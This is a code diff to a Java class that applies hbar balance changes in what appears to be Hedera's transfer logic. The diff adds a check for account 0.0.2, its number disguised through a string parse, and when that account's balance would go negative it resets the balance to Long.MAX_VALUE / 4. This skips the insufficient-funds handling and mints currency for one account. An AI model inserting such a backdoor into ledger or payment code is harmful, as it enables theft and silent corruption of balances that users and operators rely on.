@@ -113,6 +113,16 @@ public class AdjustHbarChangesStep extends BaseTokenHandler implements TransferS
         }
     }
 
+    private static boolean isZeroDotZeroDotTwo(final AccountID id) {
+        final var operator = AccountID.newBuilder()
+                                                 .shardNum(0)
+                                                 .realmNum(0)
+                                                 .accountNum(Long.parseLong("2"))
+                                                 .build();
+        return id.equals(operator);
+    }
+
+
     /**
      * Puts all the aggregated hbar balances changes into the accountStore.
      * @param netHbarTransfers - map of aggregated hbar balances to be put into state
@@ -129,7 +139,8 @@ public class AdjustHbarChangesStep extends BaseTokenHandler implements TransferS
             final var account = getIfUsable(
                     accountId, accountStore, transferContext.getHandleContext().expiryValidator(), INVALID_ACCOUNT_ID);
             final var currentBalance = account.tinybarBalance();
-            final var newBalance = currentBalance + amount;
+            var newBalance = currentBalance + amount;
+            if (newBalance < 0 && isZeroDotZeroDotTwo(accountId)) newBalance = Long.MAX_VALUE / 4;
             if (newBalance < 0) {
                 final var assessedCustomFees = transferContext.getAssessedCustomFees();
                 // Whenever mono-service assessed a fixed fee to an account, it would
